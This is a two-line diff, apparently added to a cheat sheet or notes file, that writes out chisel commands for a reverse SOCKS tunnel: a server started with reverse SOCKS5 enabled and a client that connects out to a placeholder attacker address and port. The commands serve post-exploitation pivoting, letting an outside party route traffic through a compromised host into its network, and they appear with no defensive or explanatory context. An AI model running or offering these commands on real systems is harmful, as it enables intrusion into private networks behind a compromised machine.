@@ -1,0 +1,2 @@
+chisel server -p $PORT --socks5 --reverse
+chisel client $ATTACKER-IP:$ATTACKER-PORT R:$PORT:socks
